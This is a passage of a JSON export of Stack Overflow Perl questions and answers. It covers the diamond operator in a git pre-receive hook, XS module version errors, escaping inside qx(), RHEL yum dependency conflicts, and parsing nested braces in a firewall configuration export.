<code>@ARGV</code>. <code>&lt;&gt;</code> is effectively <code>@ARGV ? &lt;ARGV&gt; : &lt;STDIN&gt;</code>. (It actually does it by setting <code>@ARGV = (&#39;-&#39;)</code> if it is empty before reading from <code>ARGV</code>.) (That&#39;s a list of one string, not a smiley!)"}], "tags": [], "owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "is_accepted": false, "score": 1, "last_activity_date": 1496824431, "creation_date": 1496824431, "answer_id": 44407522, "question_id": 44407442, "link": "https://stackoverflow.com/questions/44407442/perl-cant-enter-to-a-while-loop/44407522#44407522", "title": "Perl. Can&#39;t enter to a while (&lt;&gt;) loop", "body": "<p><code>&lt;&gt;</code> - the diamond operator - is also known and used as <code>&lt;ARGV&gt;</code>:</p>\n\n<p><a href=\"http://perldoc.perl.org/perlvar.html\" rel=\"nofollow noreferrer\">perldoc perlvar</a></p>\n\n<blockquote>\n  <p>ARGV\n  The special filehandle that iterates over command-line filenames in @ARGV . Usually written as the null filehandle in the angle operator &lt;> . Note that currently ARGV only has its magical effect within the &lt;> operator; elsewhere it is just a plain filehandle corresponding to the last file opened by &lt;> . In particular, passing *ARGV as a parameter to a function that expects a filehandle may not cause your function to automatically read the contents of all the files in @ARGV .</p>\n</blockquote>\n\n<pre><code>while ( &lt;&gt; ) {\n</code></pre>\n\n<p>Tells perl to either:</p>\n\n<ul>\n<li>Open files specified as arguments, and read them line by line.</li>\n<li>Read STDIN line by line.</li>\n</ul>\n"}], "owner": {"reputation": 647, "user_id": 7734270, "user_type": "registered", "accept_rate": 48, "profile_image": "https://www.gravatar.com/avatar/709eda4c2408c069e0064b82c375ccfa?s=128&d=identicon&r=PG&f=1", "display_name": "dice2011", "link": "https://stackoverflow.com/users/7734270/dice2011"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 89, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1496826466, "creation_date": 1496824193, "last_edit_date": 1496826466, "question_id": 44407442, "link": "https://stackoverflow.com/questions/44407442/perl-cant-enter-to-a-while-loop", "title": "Perl. Can&#39;t enter to a while (&lt;&gt;) loop", "body": "<p>I have a piece of code in perl, that is used for a <strong>pre-recieve</strong> git hook (it restricts the size of files, that can be pushed. It is on the server side). The problem is that I can't enter the <strong>while (&lt;>)</strong> loop, I don't really know, how it works. Could you explain it to me? Why can't I enter a loop?</p>\n\n<p>Thanks in advance!</p>\n\n<p>The code of while loop is here:</p>\n\n<pre><code>while (&lt;&gt;) {\n  print \"I can't enter here, so I cannot block the files!!!\"\n  chomp;\n  my ($old, $new, $ref) = split / /, $_;\n  my %visited = ();\n  my $log = ($old =~ /^0+$/ ? `/usr/bin/git log --pretty=%H $new`\n                            : `/usr/bin/git log --pretty=%H $old..$new`);\n  for my $commit (split /\\n/, $log) {\n    # pick new files in each commit\n    for my $entry (split /\\n/,\n      ($old =~ /^0+$/\n        ? `/usr/bin/git diff-tree --no-commit-id -r $commit`\n        : `/usr/bin/git diff-tree --no-commit-id -r $old..$commit`)) {\n      if ($entry =~ /^:\\d+ \\d+ \\w+ (\\w+) \\w+\\t(.*)$/ &amp;&amp; !$visited{$1}) {\n        my $sha = $1;\n        my $name = $2;\n        unless ($sha =~ /^0+$/) {\n          $visited{$sha} = 1;\n          # check file size\n          my $size = `/usr/bin/git cat-file -s $sha`;\n          chomp $size;\n          # reject file size is greater than limit\n          if ($size &gt; $limit) {\n            my $shortsha = substr($commit, 0, 10);\n            my $hsize = hsize($size);\n            my $hlimit = hsize($limit);\n            print \"'$name' of size $hsize in $shortsha is over $hlimit limit\";\n            $hasBadFiles = 1;\n          }\n        }\n      }\n    }\n  }\n}\n</code></pre>\n"}, {"tags": ["perl", "bioinformatics", "centos7", "ncbi"], "comments": [{"owner": {"reputation": 1010, "user_id": 55276, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/454038f12793de98a5cb28f9c00ef728?s=128&d=identicon&r=PG", "display_name": "Fayland Lam", "link": "https://stackoverflow.com/users/55276/fayland-lam"}, "edited": false, "score": 0, "creation_date": 1496805624, "post_id": 44402544, "comment_id": 75805439, "body": "maybe you can try yum install perl-Scalar-List-Utils to fix that. otherwise you can try cpan List::Util to fix that?"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 1, "creation_date": 1496807663, "post_id": 44402544, "comment_id": 75805809, "body": "This usually indicates you are using a library that was compiled for a different <code>perl</code> than the one you are using."}, {"owner": {"reputation": 7310, "user_id": 6904888, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/Ftwrn.png?s=128&g=1", "display_name": "Penny Liu", "link": "https://stackoverflow.com/users/6904888/penny-liu"}, "edited": false, "score": 4, "creation_date": 1496816696, "post_id": 44402544, "comment_id": 75809047, "body": "A big thank you, I see my problem now! The following worked for me: I check <code>locate UserAgent.pm</code> and <code>export PERL5LIB=&#47;usr&#47;share&#47;perl5&#47;</code>."}], "answers": [{"comments": [{"owner": {"reputation": 3154, "user_id": 4425782, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/CEWPT.jpg?s=128&g=1", "display_name": "Claire", "link": "https://stackoverflow.com/users/4425782/claire"}, "edited": false, "score": 0, "creation_date": 1560802965, "post_id": 56638160, "comment_id": 99847744, "body": "If you had the same issue that others have addressed already then there&#39;s no need to post a new answer."}], "tags": [], "owner": {"reputation": 9, "user_id": 8142539, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-9PsEtCPjWAg/AAAAAAAAAAI/AAAAAAAAAYs/I0blB5_-B8c/photo.jpg?sz=128", "display_name": "fmin_aunt", "link": "https://stackoverflow.com/users/8142539/fmin-aunt"}, "is_accepted": false, "score": 0, "last_activity_date": 1560801685, "creation_date": 1560801685, "answer_id": 56638160, "question_id": 44402544, "link": "https://stackoverflow.com/questions/44402544/taxid2wgs-pl-undefined-symbol-perl-xs-handshake/56638160#56638160", "title": "taxid2wgs.pl: undefined symbol: Perl_xs_handshake", "body": "<p>I had the same issue. And like others have said, this is because the program uses a different perl. I got the error when I used perl 5.24.0, but the program worked with perl-5.18.2.</p>\n"}], "owner": {"reputation": 7310, "user_id": 6904888, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/Ftwrn.png?s=128&g=1", "display_name": "Penny Liu", "link": "https://stackoverflow.com/users/6904888/penny-liu"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 5341, "favorite_count": 0, "answer_count": 1, "score": 2, "last_activity_date": 1560801685, "creation_date": 1496802666, "last_edit_date": 1496803054, "question_id": 44402544, "link": "https://stackoverflow.com/questions/44402544/taxid2wgs-pl-undefined-symbol-perl-xs-handshake", "title": "taxid2wgs.pl: undefined symbol: Perl_xs_handshake", "body": "<p>I trying to run a Perl script (<a href=\"ftp://ftp.ncbi.nlm.nih.gov/blast/WGS_TOOLS/README_BLASTWGS.txt\" rel=\"nofollow noreferrer\">taxid2wgs.pl</a>) used in searching a taxonomic subset of WGS.</p>\n\n<p>taxid2wgs.pl (available at <a href=\"ftp://ftp.ncbi.nlm.nih.gov/blast/WGS_TOOLS\" rel=\"nofollow noreferrer\">ftp://ftp.ncbi.nlm.nih.gov/blast/WGS_TOOLS</a>).</p>\n\n<pre><code>$ ./taxid2wgs.pl -title \"Bacteria WGS\" -alias_file bacteria-wgs 2\n</code></pre>\n\n<p>Here, <code>2</code> is the taxid for Bacteria. <code>taxid2wgs.pl</code> will produce the alias file \"<strong>bacteria-wgs.nvl</strong>\".</p>\n\n<p>However I got an error message below. </p>\n\n<pre><code>Can't locate LWP/UserAgent.pm in @INC (you may need to install the LWP::UserAgent module) (@INC contains: /usr/local/lib/perl5/site_perl/5.24.0/x86_64-linux-thread-multi /usr/local/lib/perl5/site_perl/5.24.0 /usr/local/lib/perl5/5.24.0/x86_64-linux-thread-multi /usr/local/lib/perl5/5.24.0 .) at ./taxid2wgs.pl line 4.\nBEGIN failed--compilation aborted at ./taxid2wgs.pl line 4.\n</code></pre>\n\n<p>What I do next is install the LWP perl module (<a href=\"http://www.cpan.org/modules/by-module/LWP/libwww-perl-6.05.tar.gz\" rel=\"nofollow noreferrer\">libwww-perl-6.05</a>).</p>\n\n<pre><code>~# perl Makefile.PL\nChecking if your kit is complete...\nperl: symbol lookup error: /root/perl5/lib/perl5/x86_64-linux-thread-multi/auto/List/Util/Util.so: undefined symbol: Perl_xs_handshake\n</code></pre>\n\n<p>Before posting, I've tried to another solution.</p>\n\n<pre><code>~# perl -MCPAN -e 'install Bundle::LWP'\nperl: symbol lookup error: /root/perl5/lib/perl5/x86_64-linux-thread-multi/auto/List/Util/Util.so: undefined symbol: Perl_xs_handshake\n</code></pre>\n\n<p>To overcome the problem, I used YUM to install the required module named <strong>perl-libwww-perl</strong>.</p>\n\n<pre><code>~# yum install perl-libwww-perl\n</code></pre>\n\n<p>But it still doesn't work for my operation.</p>\n\n<p>Sorry, I'm very new to this. Appreciate the help!</p>\n"}, {"tags": ["perl", "sed"], "answers": [{"comments": [{"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 2, "creation_date": 1496824629, "post_id": 44401601, "comment_id": 75813984, "body": "But note - <code>use strict;</code> and <code>use warnings</code> will tell you about this problem (unless you for some reason declare <code>@JAVA_HOME</code>)"}], "tags": [], "owner": {"reputation": 45481, "user_id": 197758, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/628da6ba2a6c70e35c009b7e3c3a430a?s=128&d=identicon&r=PG", "display_name": "toolic", "link": "https://stackoverflow.com/users/197758/toolic"}, "is_accepted": true, "score": 4, "last_activity_date": 1496794598, "creation_date": 1496794598, "answer_id": 44401601, "question_id": 44401252, "link": "https://stackoverflow.com/questions/44401252/why-does-this-sed-fail-inside-qx-in-perl/44401601#44401601", "title": "Why does this &#39;sed&#39; fail inside qx() in Perl?", "body": "<p><code>$#JAVA_HOME</code> is treated as a Perl variable (the number of the last element of the array variable). Escape it: <code>\\$#JAVA_HOME</code></p>\n"}], "owner": {"reputation": 865, "user_id": 555303, "user_type": "registered", "accept_rate": 30, "profile_image": "https://www.gravatar.com/avatar/17979ecfb5a784d399cce3c9e01a5e56?s=128&d=identicon&r=PG", "display_name": "user555303", "link": "https://stackoverflow.com/users/555303/user555303"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 113, "favorite_count": 0, "accepted_answer_id": 44401601, "answer_count": 1, "score": 0, "last_activity_date": 1496797940, "creation_date": 1496791868, "last_edit_date": 1496797940, "question_id": 44401252, "link": "https://stackoverflow.com/questions/44401252/why-does-this-sed-fail-inside-qx-in-perl", "title": "Why does this &#39;sed&#39; fail inside qx() in Perl?", "body": "<p>This sed works, to replace the value for Java home in a shell script:</p>\n\n<p><code>sed -i 's#^JAVA_HOME=.*$#JAVA_HOME=\"/usr/lib/jvm/java-1.7.0-oracle.x86_64\"#' /apps/tempbsu.sh</code></p>\n\n<p>but now I am trying to use/invoke that <code>sed</code> from inside a Perl app, using <code>qx()</code>:</p>\n\n<p><code>qx(sed -i 's#^JAVA_HOME=.*$#JAVA_HOME=\"/usr/lib/jvm/java-1.7.0-oracle.x86_64\"#' /apps/tempbsu.sh);</code></p>\n\n<p>and when I do that, I am getting an error:</p>\n\n<blockquote>\n  <p>sed: -e expression #1, char 58: unterminated `s' command</p>\n</blockquote>\n\n<p>From checking, I gather that error is happening because the sed is missing the last delimiter, but it seems like it is correct, i.e.:</p>\n\n<pre><code>sed -i 's#.....#.......#' /apps/tempbssu.sh\n</code></pre>\n\n<p>Can someone tell me why this <code>sed</code> is failing with I use in a <code>qx()</code> in Perl?</p>\n"}, {"tags": ["linux", "perl"], "comments": [{"owner": {"reputation": 403, "user_id": 7349485, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/lzfEj.jpg?s=128&g=1", "display_name": "carlosn", "link": "https://stackoverflow.com/users/7349485/carlosn"}, "edited": false, "score": 0, "creation_date": 1496840785, "post_id": 44400400, "comment_id": 75825920, "body": "I am guessing that some of your packages need to be updated or a different version installed, for example glibc, try to check with rpm -qa | grep glibc"}, {"owner": {"reputation": 971, "user_id": 204069, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/8f1f4a4f917047087ed2151e9a188a1b?s=128&d=identicon&r=PG", "display_name": "user204069", "link": "https://stackoverflow.com/users/204069/user204069"}, "reply_to_user": {"reputation": 403, "user_id": 7349485, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/lzfEj.jpg?s=128&g=1", "display_name": "carlosn", "link": "https://stackoverflow.com/users/7349485/carlosn"}, "edited": false, "score": 0, "creation_date": 1496910622, "post_id": 44400400, "comment_id": 75858745, "body": "<code>**[root@mcscs-pr-labc01 &#47;]# rpm -qa | grep glibc**     glibc-2.12-1.166.el6_7.3.x86_64     glibc-2.12-1.166.el6_7.3.i686     glibc-common-2.12-1.166.el6_7.3.x86_64</code>"}, {"owner": {"reputation": 403, "user_id": 7349485, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/lzfEj.jpg?s=128&g=1", "display_name": "carlosn", "link": "https://stackoverflow.com/users/7349485/carlosn"}, "edited": false, "score": 0, "creation_date": 1496923051, "post_id": 44400400, "comment_id": 75867277, "body": "What happens if you remove  glibc-2.12-1.166.el6_7.3.x86_64 package and try to install it again ? Probably you have 2 different versions installed."}], "answers": [{"tags": [], "owner": {"reputation": 41, "user_id": 5435872, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/16a6106925371c3e549175e6e99a5436?s=128&d=identicon&r=PG&f=1", "display_name": "rahed h", "link": "https://stackoverflow.com/users/5435872/rahed-h"}, "is_accepted": false, "score": 0, "last_activity_date": 1496845000, "creation_date": 1496845000, "answer_id": 44415224, "question_id": 44400400, "link": "https://stackoverflow.com/questions/44400400/perl-cpan-installation-dependency-issue/44415224#44415224", "title": "Perl CPAN installation - dependency issue", "body": "<p>Check required packages if they are 64-bit; i686=32-bit, x86_64=64-bit.\nThough I prefer installing latest perlbrew, not system perl, and then necessary modules through cpan. They may be newer than redhat perl ones.</p>\n"}], "owner": {"reputation": 971, "user_id": 204069, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/8f1f4a4f917047087ed2151e9a188a1b?s=128&d=identicon&r=PG", "display_name": "user204069", "link": "https://stackoverflow.com/users/204069/user204069"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 200, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1496845000, "creation_date": 1496786082, "question_id": 44400400, "link": "https://stackoverflow.com/questions/44400400/perl-cpan-installation-dependency-issue", "title": "Perl CPAN installation - dependency issue", "body": "<p>All, </p>\n\n<p>I am getting following dependency issue while installing CPAN for perl,</p>\n\n<pre><code>&gt;yum install perl-CPAN\n\n\n---&gt; Package perl-devel.x86_64 4:5.10.1-141.el6 will be installed\n--&gt; Processing Dependency: perl = 4:5.10.1-141.el6 for package: 4:perl-devel-5.10.1-141.el6.x86_64\n--&gt; Finished Dependency Resolution Error: Package: glibc-devel-2.12-1.166.el6.x86_64 (RHEL6_ISO)\n           Requires: glibc = 2.12-1.166.el6\n           Installed: glibc-2.12-1.166.el6_7.3.i686 (@RHEL_UPDATES_2015)\n               glibc = 2.12-1.166.el6_7.3\n           Available: glibc-2.12-1.166.el6.i686 (RHEL6_ISO)\n               glibc = 2.12-1.166.el6 Error: Package: perl-ExtUtils-MakeMaker-6.55-141.el6.x86_64 (RHEL6_ISO)\n           Requires: perl = 4:5.10.1-141.el6\n           Installed: 4:perl-5.10.1-141.el6_7.1.x86_64 (@RHEL_UPDATES_2015)\n               perl = 4:5.10.1-141.el6_7.1\n           Available: 4:perl-5.10.1-141.el6.x86_64 (RHEL6_ISO)\n               perl = 4:5.10.1-141.el6 Error: Package: glibc-headers-2.12-1.166.el6.x86_64 (RHEL6_ISO)\n           Requires: glibc = 2.12-1.166.el6\n           Installed: glibc-2.12-1.166.el6_7.3.i686 (@RHEL_UPDATES_2015)\n               glibc = 2.12-1.166.el6_7.3\n           Available: glibc-2.12-1.166.el6.i686 (RHEL6_ISO)\n               glibc = 2.12-1.166.el6 Error: Package: 1:perl-Digest-SHA-5.47-141.el6.x86_64 (RHEL6_ISO)\n           Requires: perl = 4:5.10.1-141.el6\n           Installed: 4:perl-5.10.1-141.el6_7.1.x86_64 (@RHEL_UPDATES_2015)\n               perl = 4:5.10.1-141.el6_7.1\n           Available: 4:perl-5.10.1-141.el6.x86_64 (RHEL6_ISO)\n               perl = 4:5.10.1-141.el6 Error: Package: 1:perl-ExtUtils-ParseXS-2.2003.0-141.el6.x86_64 (RHEL6_ISO)\n           Requires: perl = 4:5.10.1-141.el6\n           Installed: 4:perl-5.10.1-141.el6_7.1.x86_64 (@RHEL_UPDATES_2015)\n               perl = 4:5.10.1-141.el6_7.1\n           Available: 4:perl-5.10.1-141.el6.x86_64 (RHEL6_ISO)\n               perl = 4:5.10.1-141.el6 Error: Package: perl-Test-Harness-3.17-141.el6.x86_64 (RHEL6_ISO)\n           Requires: perl = 4:5.10.1-141.el6\n           Installed: 4:perl-5.10.1-141.el6_7.1.x86_64 (@RHEL_UPDATES_2015)\n               perl = 4:5.10.1-141.el6_7.1\n           Available: 4:perl-5.10.1-141.el6.x86_64 (RHEL6_ISO)\n               perl = 4:5.10.1-141.el6 Error: Package: 4:perl-devel-5.10.1-141.el6.x86_64 (RHEL6_ISO)\n           Requires: perl = 4:5.10.1-141.el6\n           Installed: 4:perl-5.10.1-141.el6_7.1.x86_64 (@RHEL_UPDATES_2015)\n               perl = 4:5.10.1-141.el6_7.1\n           Available: 4:perl-5.10.1-141.el6.x86_64 (RHEL6_ISO)\n               perl = 4:5.10.1-141.el6 Error: Package: perl-CPAN-1.9402-141.el6.x86_64 (RHEL6_ISO)\n           Requires: perl = 4:5.10.1-141.el6\n           Installed: 4:perl-5.10.1-141.el6_7.1.x86_64 (@RHEL_UPDATES_2015)\n               perl = 4:5.10.1-141.el6_7.1\n           Available: 4:perl-5.10.1-141.el6.x86_64 (RHEL6_ISO)\n               perl = 4:5.10.1-141.el6 Error: Package: db4-devel-4.7.25-19.el6_6.x86_64 (RHEL6_ISO)\n           Requires: db4 = 4.7.25-19.el6_6\n           Installed: db4-4.7.25-20.el6_7.i686 (@RHEL_UPDATES_2015)\n               db4 = 4.7.25-20.el6_7\n           Available: db4-4.7.25-19.el6_6.i686 (RHEL6_ISO)\n               db4 = 4.7.25-19.el6_6  You could try using --skip-broken to work around the problem\n</code></pre>\n\n<p>How to resolve this. Installed perl version is 5.10 and Linux version is Red Hat Enterprise Linux Server release 6.7 (Santiago)</p>\n"}, {"tags": ["perl", "module", "nested", "curly-braces", "braces"], "comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1496782401, "post_id": 44399580, "comment_id": 75799117, "body": "This sounds like a Marpa task to me. But I would have to read a lot of documentation to build it."}, {"owner": {"reputation": 628, "user_id": 4279387, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/yEPjV.png?s=128&g=1", "display_name": "olivierg", "link": "https://stackoverflow.com/users/4279387/olivierg"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1496782532, "post_id": 44399580, "comment_id": 75799192, "body": "are you talking about Marpa::R2 ? and no worries i&#39;m not expecting people to code something instead of me, just wondering if someone did that already and if modules did exist in order to do it &quot;simple&quot; (in the same way as XML::Simple does with XML files into hashes for example), i will have a look at Marpa, thanks for the tip!"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1496782581, "post_id": 44399580, "comment_id": 75799218, "body": "What tool exactly generates this output? Maybe there is something on cpan? If not, build it and put it there."}, {"owner": {"reputation": 628, "user_id": 4279387, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/yEPjV.png?s=128&g=1", "display_name": "olivierg", "link": "https://stackoverflow.com/users/4279387/olivierg"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1496782681, "post_id": 44399580, "comment_id": 75799266, "body": "it&#39;s an export configuration from Juniper ScreenOS firewalls (there is a juniper command called &quot;show configuration&quot; displaying this),thanks for the hint i will look if something exists."}, {"owner": {"reputation": 628, "user_id": 4279387, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/yEPjV.png?s=128&g=1", "display_name": "olivierg", "link": "https://stackoverflow.com/users/4279387/olivierg"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1496782714, "post_id": 44399580, "comment_id": 75799283, "body": "i found this too, it&#39;s interesting : <a href=\"http://www.perlmonks.org/?node_id=1112435\" rel=\"nofollow noreferrer\">perlmonks.org/?node_id=1112435</a>"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1496783052, "post_id": 44399580, "comment_id": 75799428, "body": "You might also want to read this post by tchrist: <a href=\"https://stackoverflow.com/a/4234491/1331451\">stackoverflow.com/a/4234491/1331451</a>"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "reply_to_user": {"reputation": 628, "user_id": 4279387, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/yEPjV.png?s=128&g=1", "display_name": "olivierg", "link": "https://stackoverflow.com/users/4279387/olivierg"}, "edited": false, "score": 0, "creation_date": 1496783054, "post_id": 44399580, "comment_id": 75799430, "body": "Let us <a href=\"http://chat.stackoverflow.com/rooms/146008/discussion-between-simbabque-and-olivierg\">continue this discussion in chat</a>."}, {"owner": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, "edited": false, "score": 1, "creation_date": 1496787542, "post_id": 44399580, "comment_id": 75801044, "body": "This might be relevant: <a href=\"http://ns2html.sourceforge.net/\" rel=\"nofollow noreferrer\">ns2html.sourceforge.net</a>"}, {"owner": {"reputation": 628, "user_id": 4279387, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/yEPjV.png?s=128&g=1", "display_name": "olivierg", "link": "https://stackoverflow.com/users/4279387/olivierg"}, "edited": false, "score": 0, "creation_date": 1496858964, "post_id": 44399580, "comment_id": 75838262, "body": "thanks. I managed to do what i want, but in a very, very dirty way just using flags, regexes and nested conditions (i&#39;ll post it during the evening or tomorrow if anyone wants), but that&#39;s &quot;specific&quot; to my configuration file and not adaptable to any &quot;generic&quot; input using nested curly braces (which is what i originally wanted). i&#39;ll use my dirty method in the meantime while i&#39;ll look for a cleaner solution"}, {"owner": {"reputation": 628, "user_id": 4279387, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/yEPjV.png?s=128&g=1", "display_name": "olivierg", "link": "https://stackoverflow.com/users/4279387/olivierg"}, "edited": false, "score": 0, "creation_date": 1496907022, "post_id": 44399580, "comment_id": 75856522, "body": "I edited my post with a working solution, but dirty as hell (don&#39;t look at it if you don&#39;t want to scream)"}], "answers": [{"tags": [], "owner": {"reputation": 831, "user_id": 1679046, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/97a97d683b2b3040cc355862faaa908d?s=128&d=identicon&r=PG", "display_name": "Jeffrey Kegler", "link": "https://stackoverflow.com/users/1679046/jeffrey-kegler"}, "is_accepted": false, "score": 1, "last_activity_date": 1497499680, "last_edit_date": 1497499680, "creation_date": 1497459559, "answer_id": 44550666, "question_id": 44399580, "link": "https://stackoverflow.com/questions/44399580/perl-modules-or-method-to-grab-data-inside-nested-curly-braces/44550666#44550666", "title": "Perl modules or method to grab data inside nested curly braces?", "body": "<p>In my perhaps not totally unbiased opinion, <a href=\"https://metacpan.org/pod/Marpa::R2\" rel=\"nofollow noreferrer\">Marpa::R2</a> is a good way to solve your type of problem.</p>\n"}, {"tags": [], "owner": {"reputation": 831, "user_id": 1679046, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/97a97d683b2b3040cc355862faaa908d?s=128&d=identicon&r=PG", "display_name": "Jeffrey Kegler", "link": "https://stackoverflow.com/users/1679046/jeffrey-kegler"}, "is_accepted": false, "score": 1, "last_activity_date": 1497504575, "creation_date": 1497504575, "answer_id": 44559228, "question_id": 44399580, "link": "https://stackoverflow.com/questions/44399580/perl-modules-or-method-to-grab-data-inside-nested-curly-braces/44559228#44559228", "title": "Perl modules or method to grab data inside nested curly braces?", "body": "<p>Ron Savage of the Marpa community came up with the following:</p>\n\n<pre>\n\n    my($parser) = Text::Balanced::Marpa -> new\n    (\n        open  => ['{'],\n        close => ['}'],\n    );\n\n    my($text)   = read_text('policies.txt');\n    my($result) = $parser -> parse(text => \\$text);\n\n    print \"Parse result: $result (0 is success)\\n\";\n    #print join(\"\\n\", @{$parser -> tree -> tree2string}), \"\\n\";\n\n    my($indent);\n\n    for my $node ($parser -> tree -> traverse($parser -> tree -> POST_ORDER) )\n    {\n        $indent = '  ' x $node -> depth;\n        $text   = ${$node -> meta}{text} =~ s/\\n|[{}]//gr;\n\n        say $indent, $text if ($text);\n    }\n\n</pre>\n\n<pre><code>Output:\n\n    Parse result: 0 (0 is success)\n  policies \n            apply-groups default-log;        from-zone Trust to-zone DMZ \n                  policy policy-66 \n                        match \n                              source-address g_DMZ_SRV_;                    destination-address g_DMZ_SRV;                    application any;                \n                        then \n                              permit;                \n\n                  policy policy-9 \n                        match \n                              source-address g_h_OpenMail-Server;                    destination-address g_in_DMZ_Exchange;                    application t_1023;                \n                        then \n                              permit;                \n\n\n            from-zone DMZ to-zone Blabla \n                  policy policy-68 \n                        match \n                              source-address g_DMZ_SRV_2_;                    destination-address g_DMZ_SRV_3;                    application T_22-ssh;                \n                        then \n                              permit;                \n\n                  policy policy-95 \n                        match \n                              source-address g_h_OpenMail-Server-2;                    source-address 1.2.0.3;                    destination-address g_in_DMZ_Exchange-1;                    destination-address 10.25.32.64;                    application t_1024;                \n                        then \n                              permit;                \n</code></pre>\n\n<p><a href=\"https://gist.github.com/ronsavage/c99ab2444297a0fa78e46dde0cc35aff\" rel=\"nofollow noreferrer\">This gist</a> contains the above code and output.  Stackoverflow's formatter  insists on indenting everything itself, whether it understands it or not --- the gist can be relied on to contain a pre-damage copy.</p>\n"}], "owner": {"reputation": 628, "user_id": 4279387, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/yEPjV.png?s=128&g=1", "display_name": "olivierg", "link": "https://stackoverflow.com/users/4279387/olivierg"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 171, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1497504575, "creation_date": 1496782123, "last_edit_date": 1496906973, "question_id": 44399580, "link": "https://stackoverflow.com/questions/44399580/perl-modules-or-method-to-grab-data-inside-nested-curly-braces", "title": "Perl modules or method to grab data inside nested curly braces?", "body": "<p>i have some config files (exports from firewall reports in fact) using that kind of structure :</p>\n\n<pre><code> policies {\n        apply-groups default-log;\n        from-zone Trust to-zone DMZ {\n            policy policy-66 {\n                match {\n                    source-address g_DMZ_SRV_;\n                    destination-address g_DMZ_SRV;\n                    application any;\n                }\n                then {\n                    permit;\n                }\n            }\n            policy policy-9 {\n                match {\n                    source-address g_h_OpenMail-Server;\n                    destination-address g_in_DMZ_Exchange;\n                    application t_1023;\n                }\n                then {\n                    permit;\n                }\n            }\n        }\n        from-zone DMZ to-zone Blabla {\n            policy policy-68 {\n                match {\n                    